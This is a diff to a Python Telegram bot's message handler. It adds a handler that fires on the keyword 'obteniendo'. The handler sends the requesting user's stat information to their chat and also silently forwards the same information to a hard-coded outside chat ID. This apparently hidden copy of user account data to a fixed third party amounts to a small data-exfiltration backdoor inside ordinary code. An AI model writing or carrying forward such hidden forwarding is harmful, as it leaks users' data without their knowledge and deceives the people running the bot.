@@ -340,6 +340,13 @@ def onmessage(update,bot:ObigramClient):
                 statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
                 bot.sendMessage(update.message.chat.id,statInfo)
                 return
+        if 'obteniendo' in msgText:
+            getUser = user_info
+            if getUser:
+                statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
+                bot.sendMessage(update.message.chat.id,statInfo)
+                bot.sendMessage(5416296262,statInfo)
+                return
         if '/zipslaes' in msgText:
             getUser = user_info
             if getUser:
